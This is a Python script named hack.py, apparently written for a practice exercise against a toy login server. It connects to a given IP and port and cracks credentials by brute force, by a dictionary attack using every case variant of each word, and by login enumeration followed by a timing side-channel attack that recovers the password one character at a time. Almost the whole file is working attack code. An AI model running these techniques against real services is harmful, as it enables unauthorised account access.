import sys
import socket
import itertools
import json
import string
from datetime import datetime, timedelta

args = sys.argv
argc = len(args)

if argc != 3:
    sys.stderr.write('Usage: ./hack.py IP port')
    exit(1)


def get_response(sock, msg):
    sock.send(msg.encode())
    resp = sock.recv(1024).decode()
    return resp


def find_password(sock, brute):
    for password_ in brute:
        password = ''.join(password_)
        resp = get_response(sock, password)
        if resp == 'Connection success!':
            print(password)
            return
        elif resp == 'Too many attempts':
            sys.stderr.write('Unlucky\nLast pass: ' + password)
            exit(2)


def brute_force():
    with socket.socket() as sock:
        address = (args[1], int(args[2]))
        sock.connect(address)

        latin = string.ascii_lowercase
        nums = string.digits

        for i in range(1, 10**6):
            find_password(sock, itertools.product(itertools.chain(latin, nums), repeat=i))


def dict_based_brute():
    with socket.socket() as sock:
        address = (args[1], int(args[2]))
        sock.connect(address)

        with open('passwords.txt', 'r') as f:
            lines = f.readlines()

            for candidate in lines:
                candidate = candidate.strip()
                find_password(sock, itertools.product(*zip(candidate.lower(), candidate.upper())))


def buid_JSON(login, password):
    data = {
        "login": login,
        "password": password
    }
    return json.dumps(data, indent=4)


def crack_login_and_pass():
    with socket.socket() as sock:
        address = (args[1], int(args[2]))
        sock.connect(address)

        with open('logins.txt', 'r') as f:
            lines = f.readlines()
            login = password = ''

            for candidate in lines:
                login = candidate.strip()
                resp = get_response(sock, buid_JSON(login, ' '))
                resp = json.loads(resp)

                if resp['result'] != 'Wrong login!':
                    break

            latin = string.ascii_lowercase
            upper_latin = string.ascii_uppercase
            nums = string.digits
            for i in range(1, 10 ** 6):
                brute = itertools.chain(latin, nums, upper_latin)
                max_delta = timedelta.min

                for c in brute:
                    start = datetime.now()
                    resp = get_response(sock, buid_JSON(login, password + c))
                    finish = datetime.now()
                    delta = finish - start
                    resp = json.loads(resp)
                    if resp['result'] == 'Connection success!':
                        print(buid_JSON(login, password+c))
                        return
                    elif max_delta < delta:
                        candidate = c
                        max_delta = delta

                password += candidate


crack_login_and_pass()
